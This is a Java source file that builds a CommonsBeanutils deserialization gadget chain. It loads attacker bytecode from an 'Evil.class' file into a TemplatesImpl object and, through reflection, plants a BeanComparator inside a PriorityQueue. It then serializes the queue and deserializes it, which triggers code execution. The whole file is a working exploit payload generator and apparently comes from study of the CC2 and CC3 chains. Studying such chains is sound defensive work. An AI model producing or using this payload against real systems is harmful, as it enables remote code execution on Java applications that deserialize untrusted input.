import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB {
    public static void main(String[] args) throws Exception {
        //CC3
        TemplatesImpl templates = new TemplatesImpl();

        Class tcls = templates.getClass();
        Field name = tcls.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "name");

//        Field tfactory = tcls.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("D:\\CCchain\\target\\classes\\Evil.class"));
        byte[][] codes = {code};
        Field bytecodes = tcls.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

//        PropertyUtils.getProperty(templates, "outputProperties");

        BeanComparator beanComparator = new BeanComparator("outputProperties", null);
//        beanComparator.compare(templates, templates);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        //CC2
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class cls = priorityQueue.getClass();
        Field comparator = cls.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, beanComparator);

        serialize(priorityQueue);
        unserialize("serialized.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("serialized.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        return obj;
    }
}
